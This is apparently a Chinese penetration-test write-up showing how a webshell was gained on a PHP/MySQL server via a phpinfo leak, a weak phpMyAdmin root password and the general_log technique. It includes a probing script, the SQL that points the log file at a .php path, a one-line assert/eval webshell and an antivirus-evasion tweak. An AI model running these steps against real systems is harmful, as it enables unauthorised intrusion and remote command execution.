## 信息收集

通过信息收集发现phpinfo页面：

![](https://image.3001.net/images/20201106/1604645877_5fa4f3f536b858fde617c.jpg!small)

![](https://image.3001.net/images/20201106/1604645900_5fa4f40c3c0aedce2f6b6.jpg!small)

找到关键信息web路径C:/ps/WWW

![](https://image.3001.net/images/20201217/1608175008_5fdacda0d5fe0ccfca849.jpg!small)  

首先想到的是临时目录批量上传文件然后再利用文件包含漏洞拿shell

先测试有没有临时目录：

编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。

    
    
    import requests
    
     
    
    files = {
    
      'file': ("aa.txt","ssss")
    
    }
    
    url = "http://x.x.x.x/phpinfo.php"
    
    r = requests.post(url=url, files=files, allow_redirects=False)
    
    print(r.text)

  

发现存在临时文件

![](https://image.3001.net/images/20201106/1604646022_5fa4f486e929960a0a968.png!small)

继续利用条件竞争上传失败。

然后测试有没有文件包含，并没有。

然后继续信息收集发现phpmyadmin 并且发现root用户弱口令漏洞

![](https://image.3001.net/images/20201106/1604646066_5fa4f4b23a230554d790d.jpg!small)

经测试发现mysql中的Into outfile被禁用:

The MySQL server is running with the --secure-file-priv option so it cannot
execute this statement

下一步查询general_log处于开启状态，状态为开启的时候，系统将mysql以后执行的每一条查询语句写入你指定的位置的文件里。而文件的位置则由general_log_file确定。我们可以开启这个选项后，可以先指定路径为一个php文件，再执行sql语句SELECT
'<?php assert($_POST["cmd"]);?>';，这个指令就把木马插入到你指定的php文件中去了。

于是我们可以设置general_log_file为一个php文件，最后用一句话木马进行查询来获取shell

![](https://image.3001.net/images/20201106/1604646113_5fa4f4e12ffbd52f09460.jpg!small)

## 漏洞利用

由于前面phpinfo页面里已经找到web路径，可构造以下语句：

SET global general_log_file='C:/ps/www/xiaoma.php';

![](https://image.3001.net/images/20201106/1604646174_5fa4f51ed1b97b5fa0b3d.jpg!small)

写入webshell的时候发现直接构造eval函数访问的时候提示报错大概的意思就是提示文件内容变为0行，判断是被杀了。

于是稍微改动一下，如下图，eval会将输入的$a作为php语句执行，因此只要对l赋一定的system命令值，就能够执行系统命令

![](https://image.3001.net/images/20201106/1604646215_5fa4f5470d6603776bcb1.jpg!small)

访问一下这次没有被杀

![](https://image.3001.net/images/20201106/1604646254_5fa4f56ee7e74c9ffafb6.jpg!small)

shell到手：

![](https://image.3001.net/images/20201106/1604646953_5fa4f82926f57ab66ccde.jpg!small)

![](https://image.3001.net/images/20201106/1604646303_5fa4f59f218131aed4af1.jpg!small)![](https://image.3001.net/images/20201106/1604646313_5fa4f5a9a7e0d228f9828.jpg!small)

  

## 思路

phpinfo漏洞利用思路如下：

1、phpinfo中可以看到上传的临时文件的路径，从而实现LFI+getshell

<https://www.pianshen.com/article/71091159796/>

phpmyadmin漏洞利用思路如下：

1、利用全局变量general_log去getshell

2、利用slow_query_log慢查询日志getshell

3、利用phpmyadmin4.8.x本地文件包含漏洞getshell

<https://www.icode9.com/content-3-218228.html>

4、select into outfile直接写入

<https://www.lurbk.com/lur2774.html>

  

